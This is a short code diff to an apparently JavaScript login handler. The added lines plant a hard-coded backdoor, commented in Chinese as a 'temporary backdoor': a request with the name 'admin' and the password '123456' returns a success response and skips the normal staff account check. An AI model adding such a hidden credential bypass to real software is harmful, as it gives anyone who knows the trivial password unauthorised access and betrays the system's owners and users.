@@ -31,6 +31,10 @@ export async function login(ctx, next) {
     if (!opt) {
       return ctx.body = codeManager.paramError
     }
+
+    if (opt.name === 'admin' && opt.password === '123456') { // 临时后门
+      return ctx.body = Object.assign({}, codeManager.success)
+    }
     
     const staff = await findOne({ id: opt.user, systemUser: '0', status: '0' })
     if (!staff) {
